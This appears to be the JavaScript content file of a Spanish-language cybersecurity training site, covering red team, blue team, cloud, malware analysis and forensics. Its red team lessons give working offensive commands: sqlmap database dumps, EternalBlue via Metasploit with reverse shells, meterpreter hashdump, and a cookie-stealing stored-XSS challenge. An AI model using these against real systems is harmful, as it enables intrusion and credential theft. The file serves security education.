/* ========================================
   CyberDefense Pro Network - Interactive App
   ======================================== */

// ========================================
// Content Database - ALL content here
// ========================================
const contentDB = {
    intro: {
        title: "Introducción a la Ciberseguridad",
        icon: "🎓",
        color: "#00d4ff",
        sections: [
            {
                title: "¿Qué es la Ciberseguridad?",
                content: `
                    <div class="content-block">
                        <p>La <strong>ciberseguridad</strong> es la práctica de proteger sistemas, redes y programas de ataques digitales.</p>
                        <div class="info-box">
                            <h4>En palabras simples:</h4>
                            <ul>
                                <li>🛡️ <strong>Proteger</strong> tus dispositivos, datos y cuentas</li>
                                <li>⚔️ <strong>Defender</strong> contra hackers, virus y estafas</li>
                                <li>🔍 <strong>Detectar</strong> amenazas antes de que causen daño</li>
                            </ul>
                        </div>
                        <div class="stats-box">
                            <div class="stat"><span class="num">3.5M</span><span>Correos maliciosos diarios</span></div>
                            <div class="stat"><span class="num">$10.5T</span><span>Costo anual del cibercrimen</span></div>
                            <div class="stat"><span class="num">3.5M</span><span>Empleos vacantes mundialmente</span></div>
                        </div>
                    </div>
                `
            },
            {
                title: "Las 5 Ramas Principales",
                content: `
                    <div class="content-block">
                        <div class="branches-grid">
                            <div class="branch-card" data-branch="red">
                                <div class="branch-icon">🔴</div>
                                <h4>Red Team</h4>
                                <p>Atacar sistemas para encontrar vulnerabilidades</p>
                                <span class="branch-tag">Ofensiva</span>
                            </div>
                            <div class="branch-card" data-branch="blue">
                                <div class="branch-icon">🔵</div>
                                <h4>Blue Team</h4>
                                <p>Proteger sistemas y detectar ataques</p>
                                <span class="branch-tag">Defensiva</span>
                            </div>
                            <div class="branch-card" data-branch="cloud">
                                <div class="branch-icon">☁️</div>
                                <h4>Cloud Security</h4>
                                <p>Seguridad en la nube (AWS, Azure, GCP)</p>
                                <span class="branch-tag">Cloud</span>
                            </div>
                            <div class="branch-card" data-branch="malware">
                                <div class="branch-icon">🦠</div>
                                <h4>Malware Analysis</h4>
                                <p>Estudiar virus y software malicioso</p>
                                <span class="branch-tag">Análisis</span>
                            </div>
                            <div class="branch-card" data-branch="forensics">
                                <div class="branch-icon">🔍</div>
                                <h4>Digital Forensics</h4>
                                <p>Investigar crímenes digitales</p>
                                <span class="branch-tag">Investigación</span>
                            </div>
                        </div>
                    </div>
                `
            },
            {
                title: "Conceptos Básicos que Debes Conocer",
                content: `
                    <div class="content-block">
                        <h4>🔐 Autenticación vs Autorización</h4>
                        <div class="comparison-table">
                            <div class="comp-item">
                                <h5>Autenticación</h5>
                                <p><strong>¿Quién eres?</strong></p>
                                <p>Login con usuario y contraseña</p>
                                <code>Usuario: admin<br>Contraseña: ****</code>
                            </div>
                            <div class="comp-item">
                                <h5>Autorización</h5>
                                <p><strong>¿Qué puedes hacer?</strong></p>
                                <p>Permisos de administrador</p>
                                <code>Puede: Leer ✅<br>Puede: Escribir ✅<br>Puede: Borrar ❌</code>
                            </div>
                        </div>
                        
                        <h4>🛡️ Triada CIA</h4>
                        <div class="cia-diagram">
                            <div class="cia-item">
                                <div class="cia-icon">🔒</div>
                                <h5>Confidencialidad</h5>
                                <p>¿Quién puede ver la información?</p>
                                <p class="example">Ejemplo: Cifrar datos sensibles</p>
                            </div>
                            <div class="cia-item">
                                <div class="cia-icon">✅</div>
                                <h5>Integridad</h5>
                                <p>¿La información es correcta?</p>
                                <p class="example">Ejemplo: Firmas digitales</p>
                            </div>
                            <div class="cia-item">
                                <div class="cia-icon">🟢</div>
                                <h5>Disponibilidad</h5>
                                <p>¿Se puede acceder a ella?</p>
                                <p class="example">Ejemplo: Backups y redundancia</p>
                            </div>
                        </div>
                    </div>
                `
            },
            {
                title: "Tu Primera Semana - Paso a Paso",
                content: `
                    <div class="content-block">
                        <div class="timeline">
                            <div class="timeline-item">
                                <div class="day">Día 1-2</div>
                                <div class="content">
                                    <h5>Preparar tu Entorno</h5>
                                    <ol>
                                        <li>Descargar <strong>VirtualBox</strong> (gratis)</li>
                                        <li>Descargar <strong>Ubuntu Desktop</strong></li>
                                        <li>Crear máquina virtual con 4GB RAM</li>
                                        <li>Instalar Ubuntu en la VM</li>
                                    </ol>
                                    <div class="code-block">
                                        <code># Verifica que VirtualBox funciona<br>VBoxManage --version</code>
                                    </div>
                                </div>
                            </div>
                            <div class="timeline-item">
                                <div class="day">Día 3-4</div>
                                <div class="content">
                                    <h5>Aprender Linux Básico</h5>
                                    <p>Comandos esenciales:</p>
                                    <div class="commands-grid">
                                        <div class="cmd"><code>pwd</code><span>Ver directorio actual</span></div>
                                        <div class="cmd"><code>ls</code><span>Listar archivos</span></div>
                                        <div class="cmd"><code>cd</code><span>Cambiar directorio</span></div>
                                        <div class="cmd"><code>mkdir</code><span>Crear carpeta</span></div>
                                        <div class="cmd"><code>nano</code><span>Editar archivo</span></div>
                                        <div class="cmd"><code>sudo</code><span>Ejecutar como admin</span></div>
                                    </div>
                                </div>
                            </div>
                            <div class="timeline-item">
                                <div class="day">Día 5</div>
                                <div class="content">
                                    <h5>Entender Redes</h5>
                                    <p>Conceptos clave:</p>
                                    <ul>
                                        <li><strong>IP Address:</strong> Dirección de tu computadora en la red</li>
                                        <li><strong>DNS:</strong> Traduce nombres a IPs (google.com → 142.250.80.46)</li>
                                        <li><strong>HTTP/HTTPS:</strong> Protocolos para sitios web</li>
                                        <li><strong>Ports:</strong> Puertos de comunicación (80=web, 22=SSH)</li>
                                    </ul>
                                </div>
                            </div>
                            <div class="timeline-item">
                                <div class="day">Día 6</div>
                                <div class="content">
                                    <h5>Tu Primer Escaneo con Nmap</h5>
                                    <div class="code-block">
                                        <code># Instalar Nmap<br>sudo apt install nmap<br><br># Escanear tu máquina<br>nmap localhost<br><br># Escanear una web (autorizada)<br>nmap scanme.nmap.org</code>
                                    </div>
                                </div>
                            </div>
                            <div class="timeline-item">
                                <div class="day">Día 7</div>
                                <div class="content">
                                    <h5>Explorar Plataformas de Práctica</h5>
                                    <ul>
                                        <li>✅ Crear cuenta en <strong>TryHackMe</strong></li>
                                        <li>✅ Completar "Introduction to Cyber Security"</li>
                                        <li>✅ Explorar la ruta "Pre-Security"</li>
                                        <li>✅ Unirte a la comunidad de Discord</li>
                                    </ul>
                                </div>
                            </div>
                        </div>
                    </div>
                `
            }
        ]
    },

    red: {
        title: "Red Team - Seguridad Ofensiva",
        icon: "🔴",
        color: "#e74c3c",
        sections: [
            {
                title: "¿Qué es el Red Team?",
                content: `
                    <div class="content-block">
                        <div class="info-box highlight">
                            <h4>Red Team = "El Bueno que se hace pasar por el Malo"</h4>
                            <p>El Red Team simula ataques reales contra una organización para identificar vulnerabilidades antes de que los atacantes reales lo hagan.</p>
                        </div>
                        <h4>Actividades principales:</h4>
                        <ul class="feature-list">
                            <li>🎯 <strong>Pentesting:</strong> Pruebas de penetración autorizadas</li>
                            <li>🔓 <strong>Explotación:</strong> Aprovechar vulnerabilidades encontradas</li>
                            <li>🎭 <strong>Ingeniería Social:</strong> Engañar personas para obtener acceso</li>
                            <li>💰 <strong>Bug Bounty:</strong> Cazar bugs por dinero real</li>
                        </ul>
                    </div>
                `
            },
            {
                title: "Lo que Aprenderás",
                content: `
                    <div class="content-block">
                        <div class="skills-learning">
                            <div class="skill-item">
                                <span class="skill-icon">📡</span>
                                <div>
                                    <h5>Reconocimiento OSINT</h5>
                                    <p>Recopilar información pública sobre el objetivo</p>
                                </div>
                            </div>
                            <div class="skill-item">
                                <span class="skill-icon">🔍</span>
                                <div>
                                    <h5>Escaneo con Nmap</h5>
                                    <p>Descubrir puertos, servicios y versiones</p>
                                </div>
                            </div>
                            <div class="skill-item">
                                <span class="skill-icon">💥</span>
                                <div>
                                    <h5>Explotación Web</h5>
                                    <p>SQL Injection, XSS, CSRF y más</p>
                                </div>
                            </div>
                            <div class="skill-item">
                                <span class="skill-icon">⚡</span>
                                <div>
                                    <h5>Metasploit Framework</h5>
                                    <p>Framework de exploits más grande del mundo</p>
                                </div>
                            </div>
                            <div class="skill-item">
                                <span class="skill-icon">👑</span>
                                <div>
                                    <h5>Escalada de Privilegios</h5>
                                    <p>Pasar de usuario a administrador/root</p>
                                </div>
                            </div>
                            <div class="skill-item">
                                <span class="skill-icon">🔄</span>
                                <div>
                                    <h5>Movimiento Lateral</h5>
                                    <p>Moverse por la red explotando otros sistemas</p>
                                </div>
                            </div>
                        </div>
                    </div>
                `
            },
            {
                title: "Guía Paso a Paso: Tu Primer Pentest",
                content: `
                    <div class="content-block">
                        <div class="interactive-guide">
                            <div class="guide-step" data-step="1">
                                <div class="step-header">
                                    <span class="step-num">1</span>
                                    <h5>Reconocimiento (OSINT)</h5>
                                    <button class="toggle-btn">▼</button>
                                </div>
                                <div class="step-body">
                                    <p>Antes de atacar, necesitas conocer a tu objetivo. Usa fuentes públicas.</p>
                                    <div class="code-block">
                                        <code># Recopilar emails y subdominios<br>theharvester -d target.com -b google,bing<br><br># Buscar en Shodan<br>shodan search "hostname:target.com"<br><br># Google Dorks<br>site:target.com filetype:pdf<br>site:target.com inurl:admin</code>
                                    </div>
                                    <div class="tip-box">
                                        <strong>💡 Tip:</strong> Siempre verifica que tienes autorización antes de escanear.
                                    </div>
                                </div>
                            </div>
                            
                            <div class="guide-step" data-step="2">
                                <div class="step-header">
                                    <span class="step-num">2</span>
                                    <h5>Escaneo y Enumeración</h5>
                                    <button class="toggle-btn">▼</button>
                                </div>
                                <div class="step-body">
                                    <p>Descubre qué puertos y servicios están abiertos.</p>
                                    <div class="code-block">
                                        <code># Escaneo completo<br>nmap -sV -sC -O target.com<br><br># Escaneo de vulnerabilidades<br>nmap --script vuln target.com<br><br># Enumeración de servicios<br>nmap -sV -p 80,443,22 target.com</code>
                                    </div>
                                    <div class="result-box">
                                        <h5>Salida esperada:</h5>
                                        <pre>PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2
80/tcp  open  http     Apache/2.4.41
443/tcp open  ssl/http Apache/2.4.41</pre>
                                    </div>
                                </div>
                            </div>
                            
                            <div class="guide-step" data-step="3">
                                <div class="step-header">
                                    <span class="step-num">3</span>
                                    <h5>Explotación</h5>
                                    <button class="toggle-btn">▼</button>
                                </div>
                                <div class="step-body">
                                    <p>Explota las vulnerabilidades encontradas para obtener acceso.</p>
                                    <div class="code-block">
                                        <code># SQL Injection con SQLMap<br>sqlmap -u "http://target.com/?id=1" --dbs<br><br># Metasploit<br>msfconsole<br>use exploit/multi/handler<br>set PAYLOAD python/meterpreter/reverse_tcp<br>run</code>
                                    </div>
                                    <div class="warning-box">
                                        <strong>⚠️ Importante:</strong> Solo explota sistemas que tengas autorización para probar.
                                    </div>
                                </div>
                            </div>
                            
                            <div class="guide-step" data-step="4">
                                <div class="step-header">
                                    <span class="step-num">4</span>
                                    <h5>Post-Explotación</h5>
                                    <button class="toggle-btn">▼</button>
                                </div>
                                <div class="step-body">
                                    <p>Mantén el acceso y escala privilegios.</p>
                                    <div class="code-block">
                                        <code># Meterpreter<br>meterpreter > getsystem      # Escalar a SYSTEM<br>meterpreter > hashdump       # Obtener hashes<br>meterpreter > shell          # Shell del sistema<br><br># Linux<br>sudo -l                      # Ver permisos<br>find / -perm -4000 2>/dev/null  # SUID binaries</code>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                `
            },
            {
                title: "Herramientas del Red Team",
                content: `
                    <div class="content-block">
                        <div class="tools-showcase">
                            <div class="tool-detail">
                                <h5>🔍 Nmap</h5>
                                <p>El escáner de redes más popular del mundo.</p>
                                <div class="code-block">
                                    <code># Escaneo básico<br>nmap target.com<br><br># Escaneo completo con versiones<br>nmap -sV -sC target.com<br><br># Escaneo de vulnerabilidades<br>nmap --script vuln target.com</code>
                                </div>
                            </div>
                            <div class="tool-detail">
                                <h5>🕷️ Burp Suite</h5>
                                <p>Proxy de testing para aplicaciones web.</p>
                                <div class="code-block">
                                    <code># 1. Configurar proxy en navegador<br># Puerto: 8080<br><br># 2. Navegar a la web objetivo<br># 3. Intercept requests<br># 4. Modificar y analizar<br># 5. Enviar a Repeater para testing</code>
                                </div>
                            </div>
                            <div class="tool-detail">
                                <h5>💥 Metasploit</h5>
                                <p>Framework de exploits más grande.</p>
                                <div class="code-block">
                                    <code># Buscar exploit<br>msfconsole<br>search eternalblue<br><br># Usar exploit<br>use exploit/windows/smb/ms17_010_eternalblue<br>set RHOSTS target_ip<br>set PAYLOAD windows/x64/meterpreter/reverse_tcp<br>exploit</code>
                                </div>
                            </div>
                        </div>
                    </div>
                `
            },
            {
                title: "Retos Prácticos",
                content: `
                    <div class="content-block">
                        <div class="challenges-interactive">
                            <div class="challenge-item easy">
                                <div class="challenge-header">
                                    <span class="difficulty easy">Fácil</span>
                                    <h5>SQL Injection Básico</h5>
                                </div>
                                <p>Encuentra y explota una vulnerabilidad SQL Injection en una web vulnerable.</p>
                                <div class="challenge-steps">
                                    <div class="mini-step">1. Identifica el parámetro vulnerable</div>
                                    <div class="mini-step">2. Prueba con comillas simples: <code>'</code></div>
                                    <div class="mini-step">3. Usa SQLMap para automatizar</div>
                                    <div class="mini-step">4. Extrae la base de datos</div>
                                </div>
                                <button class="btn btn-sm btn-primary" onclick="startChallenge('sqli')">Comenzar Reto</button>
                            </div>
                            
                            <div class="challenge-item medium">
                                <div class="challenge-header">
                                    <span class="difficulty medium">Medio</span>
                                    <h5>XSS Stored</h5>
                                </div>
                                <p>Crea una vulnerabilidad XSS almacenada para robar cookies de administrador.</p>
                                <div class="challenge-steps">
                                    <div class="mini-step">1. Encuentra un campo de entrada</div>
                                    <div class="mini-step">2. Inyecta script malicioso</div>
                                    <div class="mini-step">3. Configura tu servidor de escucha</div>
                                    <div class="mini-step">4. Captura las cookies</div>
                                </div>
                                <button class="btn btn-sm btn-primary" onclick="startChallenge('xss')">Comenzar Reto</button>
                            </div>
                            
                            <div class="challenge-item hard">
                                <div class="challenge-header">
                                    <span class="difficulty hard">Difícil</span>
                                    <h5>Privilege Escalation</h5>
                                </div>
                                <p>Escala de usuario a root en un sistema Linux configurado inseguramente.</p>
                                <div class="challenge-steps">
                                    <div class="mini-step">1. Enumera el sistema</div>
                                    <div class="mini-step">2. Busca archivos SUID</div>
                                    <div class="mini-step">3. Analiza permisos</div>
                                    <div class="mini-step">4. Explota configuración insegura</div>
                                </div>
                                <button class="btn btn-sm btn-primary" onclick="startChallenge('privesc')">Comenzar Reto</button>
                            </div>
                        </div>
                    </div>
                `
            }
        ]
    },

    blue: {
        title: "Blue Team - Seguridad Defensiva",
        icon: "🔵",
        color: "#3498db",
        sections: [
            {
                title: "¿Qué es el Blue Team?",
                content: `
                    <div class="content-block">
                        <div class="info-box highlight blue">
                            <h4>Blue Team = "El Guardián que Protege el Castillo"</h4>
                            <p>El Blue Team es responsable de defender la infraestructura contra amenazas. Monitorea, detecta y responde a incidentes.</p>
                        </div>
                        <h4>Actividades principales:</h4>
                        <ul class="feature-list">
                            <li>📊 <strong>SOC:</strong> Centro de Operaciones de Seguridad</li>
                            <li>📝 <strong>Análisis de Logs:</strong> Revisar registros de seguridad</li>
                            <li>🎯 <strong>Threat Hunting:</strong> Buscar amenazas activas</li>
                            <li>🚨 <strong>Respuesta a Incidentes:</strong> Actuar cuando hay un ataque</li>
                        </ul>
                    </div>
                `
            },
            {
                title: "Guía Paso a Paso: Configurar SOC con Wazuh",
                content: `
                    <div class="content-block">
                        <div class="interactive-guide">
                            <div class="guide-step" data-step="1">
                                <div class="step-header">
                                    <span class="step-num">1</span>
                                    <h5>Instalar Wazuh</h5>
                                    <button class="toggle-btn">▼</button>
                                </div>
                                <div class="step-body">
                                    <p>Wazuh es un SIEM gratuito y open source.</p>
                                    <div class="code-block">
                                        <code># Descargar instalador<br>curl -sO https://packages.wazuh.com/4.7/wazuh-install.sh<br><br># Ejecutar instalación<br>sudo bash ./wazuh-install.sh -a<br><br># Acceder a la interfaz<br># https://localhost:443<br># Usuario: admin<br># Contraseña: (mostrada al final de la instalación)</code>
                                    </div>
                                </div>
                            </div>
                            
                            <div class="guide-step" data-step="2">
                                <div class="step-header">
                                    <span class="step-num">2</span>
                                    <h5>Analizar Logs de Autenticación</h5>
                                    <button class="toggle-btn">▼</button>
                                </div>
                                <div class="step-body">
                                    <p>Aprende a detectar intentos de acceso fallidos.</p>
                                    <div class="code-block">
                                        <code># Buscar intentos fallidos<br>cat /var/log/auth.log | grep "Failed password"<br><br># Contar intentos por IP<br>cat /var/log/auth.log | grep "Failed password" | awk '{print $11}' | sort | uniq -c | sort -rn<br><br># Detectar brute force (más de 5 intentos)<br>cat /var/log/auth.log | grep "Failed password" | awk '{print $11}' | sort | uniq -c | awk '$1 > 5 {print}'</code>
                                    </div>
                                    <div class="result-box">
                                        <h5>Ejemplo de salida:</h5>
                                        <pre>    47 192.168.1.100
    23 10.0.0.5
     8 172.16.0.1</pre>
                                    </div>
                                </div>
                            </div>
                            
                            <div class="guide-step" data-step="3">
                                <div class="step-header">
                                    <span class="step-num">3</span>
                                    <h5>Crear Reglas de Detección</h5>
                                    <button class="toggle-btn">▼</button>
                                </div>
                                <div class="step-body">
                                    <p>Crea reglas personalizadas para detectar amenazas.</p>
                                    <div class="code-block">
                                        <code># Regla para detectar brute force<br>&lt;group name="local,syslog,sshd"&gt;<br>  &lt;rule id="100001" level="10"&gt;<br>    &lt;if_sid&gt;5712&lt;/if_sid&gt;<br>    &lt;if_matched_sid&gt;5712&lt;/if_matched_sid&gt;<br>    &lt;frequency&gt;5&lt;/frequency&gt;<br>    &lt;timeframe&gt;60&lt;/timeframe&gt;<br>    &lt;description&gt;SSH brute force attempt&lt;/description&gt;<br>  &lt;/rule&gt;<br>&lt;/group&gt;</code>
                                    </div>
                                </div>
                            </div>
                            
                            <div class="guide-step" data-step="4">
                                <div class="step-header">
                                    <span class="step-num">4</span>
                                    <h5>Monitoreo en Tiempo Real</h5>
                                    <button class="toggle-btn">▼</button>
                                </div>
                                <div class="step-body">
                                    <p>Configura alertas y dashboards.</p>
                                    <div class="code-block">
                                        <code># Ver alertas en tiempo real<br>tail -f /var/ossec/logs/alerts/alerts.log<br><br># Buscar alertas críticas<br>cat /var/ossec/logs/alerts/alerts.log | grep "level 10"<br><br># Dashboard web<br>https://localhost:443/app/wazuh</code>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                `
            },
            {
                title: "Retos de Blue Team",
                content: `
                    <div class="content-block">
                        <div class="challenges-interactive">
                            <div class="challenge-item easy">
                                <div class="challenge-header">
                                    <span class="difficulty easy">Fácil</span>
                                    <h5>Análisis de Logs</h5>
                                </div>
                                <p>Identifica actividades sospechosas en un archivo de logs.</p>
                                <button class="btn btn-sm btn-primary" onclick="startChallenge('loganalysis')">Comenzar Reto</button>
                            </div>
                            <div class="challenge-item medium">
                                <div class="challenge-header">
                                    <span class="difficulty medium">Medio</span>
                                    <h5>Configurar Wazuh</h5>
                                </div>
                                <p>Instala Wazuh y crea reglas de detección personalizadas.</p>
                                <button class="btn btn-sm btn-primary" onclick="startChallenge('wazuh')">Comenzar Reto</button>
                            </div>
                            <div class="challenge-item hard">
                                <div class="challenge-header">
                                    <span class="difficulty hard">Difícil</span>
                                    <h5>Incident Response</h5>
                                </div>
                                <p>Responde a un incidente simulado de ransomware.</p>
                                <button class="btn btn-sm btn-primary" onclick="startChallenge('incident')">Comenzar Reto</button>
                            </div>
                        </div>
                    </div>
                `
            }
        ]
    },

    cloud: {
        title: "Cloud Security",
        icon: "☁️",
        color: "#f39c12",
        sections: [
            {
                title: "¿Qué es Cloud Security?",
                content: `
                    <div class="content-block">
                        <div class="info-box highlight cloud">
                            <h4>Cloud Security = "Proteger tu información en el cielo digital"</h4>
                            <p>Seguridad de datos, aplicaciones e infraestructura en la nube (AWS, Azure, GCP).</p>
                        </div>
                        <div class="providers-grid">
                            <div class="provider-card aws">
                                <h5>☁️ AWS</h5>
                                <ul>
                                    <li>IAM (Identity Access Management)</li>
                                    <li>S3 (Almacenamiento)</li>
                                    <li>EC2 (Computación)</li>
                                    <li>VPC (Redes)</li>
                                </ul>
                            </div>
                            <div class="provider-card azure">
                                <h5>🔷 Azure</h5>
                                <ul>
                                    <li>Azure AD</li>
                                    <li>Security Center</li>
                                    <li>Virtual Networks</li>
                                    <li>Storage Accounts</li>
                                </ul>
                            </div>
                            <div class="provider-card gcp">
                                <h5>🟠 GCP</h5>
                                <ul>
                                    <li>Cloud IAM</li>
                                    <li>Cloud Storage</li>
                                    <li>Compute Engine</li>
                                    <li>VPC Networks</li>
                                </ul>
                            </div>
                        </div>
                    </div>
                `
            },
            {
                title: "Guía: Auditar AWS con Prowler",
                content: `
                    <div class="content-block">
                        <div class="interactive-guide">
                            <div class="guide-step" data-step="1">
                                <div class="step-header">
                                    <span class="step-num">1</span>
                                    <h5>Instalar Prowler</h5>
                                    <button class="toggle-btn">▼</button>
                                </div>
                                <div class="step-body">
                                    <div class="code-block">
                                        <code># Instalar con pip<br>pip install prowler<br><br># O usar Docker<br>docker pull toniblyx/prowler<br>docker run -ti toniblyx/prowler</code>
                                    </div>
                                </div>
                            </div>
                            <div class="guide-step" data-step="2">
                                <div class="step-header">
                                    <span class="step-num">2</span>
                                    <h5>Ejecutar Auditoría</h5>
                                    <button class="toggle-btn">▼</button>
                                </div>
                                <div class="step-body">
                                    <div class="code-block">
                                        <code># Auditoría completa<br>prowler aws<br><br># Solo checks de IAM<br>prowler aws --checks iam<br><br># Generar reporte HTML<br>prowler aws --output-format html</code>
                                    </div>
                                </div>
                            </div>
                            <div class="guide-step" data-step="3">
                                <div class="step-header">
                                    <span class="step-num">3</span>
                                    <h5>Interpretar Resultados</h5>
                                    <button class="toggle-btn">▼</button>
                                </div>
                                <div class="step-body">
                                    <p>Prowler clasifica hallazgos por severidad:</p>
                                    <ul>
                                        <li>🔴 <strong>CRITICAL:</strong> Requiere acción inmediata</li>
                                        <li>🟠 <strong>HIGH:</strong> Riesgo significativo</li>
                                        <li>🟡 <strong>MEDIUM:</strong> Mejorable</li>
                                        <li>🟢 <strong>LOW/PASS:</strong> OK o menor</li>
                                    </ul>
                                </div>
                            </div>
                        </div>
                    </div>
                `
            }
        ]
    },

    malware: {
        title: "Malware Analysis",
        icon: "🦠",
        color: "#9b59b6",
        sections: [
            {
                title: "¿Qué es el Análisis de Malware?",
                content: `
                    <div class="content-block">
                        <div class="info-box highlight malware">
                            <h4>Malware Analysis = "Ser el doctor que estudia la enfermedad"</h4>
                            <p>Estudiar virus, troyanos y ransomware para entender cómo funcionan y crear defensas.</p>
                        </div>
                        <div class="types-grid">
                            <div class="type-card">
                                <span class="type-icon">🦠</span>
                                <h5>Virus</h5>
                                <p>Se adjunta a archivos legítimos</p>
                            </div>
                            <div class="type-card">
                                <span class="type-icon">🪱</span>
                                <h5>Gusano</h5>
                                <p>Se propaga por la red</p>
                            </div>
                            <div class="type-card">
                                <span class="type-icon">🐴</span>
                                <h5>Troyano</h5>
                                <p>Se disfraza de software legítimo</p>
                            </div>
                            <div class="type-card">
                                <span class="type-icon">💰</span>
                                <h5>Ransomware</h5>
                                <p>Cifra datos y pide rescate</p>
                            </div>
                            <div class="type-card">
                                <span class="type-icon">👁️</span>
                                <h5>Spyware</h5>
                                <p>Recopila información secretamente</p>
                            </div>
                            <div class="type-card">
                                <span class="type-icon">🤖</span>
                                <h5>Botnet</h5>
                                <p>Red de computadoras comprometidas</p>
                            </div>
                        </div>
                    </div>
                `
            },
            {
                title: "Guía: Analizar tu Primer Malware",
                content: `
                    <div class="content-block">
                        <div class="warning-box">
                            <strong>🚨 IMPORTANTE:</strong> NUNCA analices malware en tu máquina real. Usa SIEMPRE una VM aislada.
                        </div>
                        <div class="interactive-guide">
                            <div class="guide-step" data-step="1">
                                <div class="step-header">
                                    <span class="step-num">1</span>
                                    <h5>Preparar Entorno Seguro</h5>
                                    <button class="toggle-btn">▼</button>
                                </div>
                                <div class="step-body">
                                    <div class="code-block">
                                        <code># Crear VM en VirtualBox<br># - Ubuntu 22.04<br># - 4GB RAM<br># - 50GB disco<br># - Red: Host-Only (AISLADA)<br># - Crear SNAPSHOT antes de analizar</code>
                                    </div>
                                </div>
                            </div>
                            <div class="guide-step" data-step="2">
                                <div class="step-header">
                                    <span class="step-num">2</span>
                                    <h5>Análisis Estático (sin ejecutar)</h5>
                                    <button class="toggle-btn">▼</button>
                                </div>
                                <div class="step-body">
                                    <div class="code-block">
                                        <code># Identificar tipo de archivo<br>file malware.exe<br><br># Calcular hashes<br>md5sum malware.exe<br>sha256sum malware.exe<br><br># Extraer strings<br>strings -n 8 malware.exe | head -50<br><br># Buscar en VirusTotal<br># https://www.virustotal.com (pegar hash)</code>
                                    </div>
                                </div>
                            </div>
                            <div class="guide-step" data-step="3">
                                <div class="step-header">
                                    <span class="step-num">3</span>
                                    <h5>Análisis Dinámico (ejecutando)</h5>
                                    <button class="toggle-btn">▼</button>
                                </div>
                                <div class="step-body">
                                    <div class="code-block">
                                        <code># Usar Any.Run (online)<br># https://app.any.run<br><br># Monitorear procesos<br>ps aux | grep malware<br><br># Verificar conexiones de red<br>netstat -tulpn<br><br># Capturar tráfico<br>tcpdump -i any -w capture.pcap</code>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                `
            }
        ]
    },

    forensics: {
        title: "Digital Forensics",
        icon: "🔍",
        color: "#1abc9c",
        sections: [
            {
                title: "¿Qué es la Forense Digital?",
                content: `
                    <div class="content-block">
                        <div class="info-box highlight forensics">
                            <h4>Digital Forensics = "El Detective de la Era Digital"</h4>
                            <p>Investigar incidentes digitales recolectando y analizando evidencia.</p>
                        </div>
                        <div class="types-grid">
                            <div class="type-card">
                                <span class="type-icon">💾</span>
                                <h5>Forense de Disco</h5>
                                <p>Analizar discos duros e imágenes</p>
                            </div>
                            <div class="type-card">
                                <span class="type-icon">🧠</span>
                                <h5>Forense de Memoria</h5>
                                <p>Analizar volcados de RAM</p>
                            </div>
                            <div class="type-card">
                                <span class="type-icon">🌐</span>
                                <h5>Forense de Red</h5>
                                <p>Analizar tráfico capturado</p>
                            </div>
                        </div>
                    </div>
                `
            },
            {
                title: "Guía: Análisis Básico de Disco",
                content: `
                    <div class="content-block">
                        <div class="interactive-guide">
                            <div class="guide-step" data-step="1">
                                <div class="step-header">
                                    <span class="step-num">1</span>
                                    <h5>Crear Imagen Forense</h5>
                                    <button class="toggle-btn">▼</button>
                                </div>
                                <div class="step-body">
                                    <div class="code-block">
                                        <code># Crear imagen bit-a-bit con dd<br>sudo dd if=/dev/sda of=evidencia.dd bs=4M<br><br># Verificar integridad<br>md5sum evidencia.dd<br>sha256sum evidencia.dd</code>
                                    </div>
                                </div>
                            </div>
                            <div class="guide-step" data-step="2">
                                <div class="step-header">
                                    <span class="step-num">2</span>
                                    <h5>Analizar con Autopsy</h5>
                                    <button class="toggle-btn">▼</button>
                                </div>
                                <div class="step-body">
                                    <div class="code-block">
                                        <code># Instalar Autopsy<br>sudo apt install autopsy<br><br># Abrir interfaz web<br>http://localhost:9999/autopsy<br><br># 1. Create New Case<br># 2. Add Image File<br># 3. Analyze</code>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                `
            }
        ]
    },

    iot: {
        title: "IoT Security",
        icon: "📡",
        color: "#e67e22",
        sections: [
            {
                title: "¿Qué es IoT Security?",
                content: `
                    <div class="content-block">
                        <div class="info-box highlight iot">
                            <h4>IoT Security = "Proteger los dispositivos inteligentes"</h4>
                            <p>Cámaras, routers, dispositivos médicos, sistemas industriales.</p>
                        </div>
                        <div class="types-grid">
                            <div class="type-card">
                                <span class="type-icon">📷</span>
                                <h5>Cámaras IP</h5>
                                <p>Credenciales débiles comunes</p>
                            </div>
                            <div class="type-card">
                                <span class="type-icon">🔒</span>
                                <h5>Smart Locks</h5>
                                <p>Vulnerabilidades Bluetooth</p>
                            </div>
                            <div class="type-card">
                                <span class="type-icon">🏭</span>
                                <h5>ICS/SCADA</h5>
                                <p>Sistemas industriales críticos</p>
                            </div>
                        </div>
                    </div>
                `
            }
        ]
    },

    ai: {
        title: "AI Security",
        icon: "🤖",
        color: "#e91e63",
        sections: [
            {
                title: "¿Qué es AI Security?",
                content: `
                    <div class="content-block">
                        <div class="info-box highlight ai">
                            <h4>AI Security = "Proteger y usar la Inteligencia Artificial"</h4>
                            <p>Proteger modelos de IA y usar IA para mejorar la ciberseguridad.</p>
                        </div>
                        <div class="types-grid">
                            <div class="type-card">
                                <span class="type-icon">💉</span>
                                <h5>Prompt Injection</h5>
                                <p>Manipular LLMs con prompts</p>
                            </div>
                            <div class="type-card">
                                <span class="type-icon">🔓</span>
                                <h5>Jailbreaking</h5>
                                <p>Bypass de restricciones</p>
                            </div>
                            <div class="type-card">
                                <span class="type-icon">🎯</span>
                                <h5>AI Red Teaming</h5>
                                <p>Probar seguridad de modelos</p>
                            </div>
                        </div>
                    </div>
                `
            }
        ]
    }
};

// ========================================
// App State
// ========================================
let currentSection = 'intro';
let currentSubsection = 0;

// ========================================
// Navigation
// ========================================
function initNavigation() {
    // Theme toggle
    const themeToggle = document.getElementById('themeToggle');
    if (themeToggle) {
        themeToggle.addEventListener('click', toggleTheme);
    }
    
    // Mobile toggle
    const mobileToggle = document.getElementById('mobileToggle');
    const navMenu = document.getElementById('navMenu');
    if (mobileToggle && navMenu) {
        mobileToggle.addEventListener('click', () => {
            navMenu.classList.toggle('active');
        });
    }
    
    // Smooth scroll for nav links
    document.querySelectorAll('.nav-link').forEach(link => {
        link.addEventListener('click', (e) => {
            const href = link.getAttribute('href');
            if (href.startsWith('#')) {
                e.preventDefault();
                const target = document.querySelector(href);
                if (target) {
                    target.scrollIntoView({ behavior: 'smooth' });
                }
            }
        });
    });
    
    // Career card clicks
    document.querySelectorAll('.career-block').forEach(block => {
        const header = block.querySelector('.career-header');
        if (header) {
            header.addEventListener('click', () => {
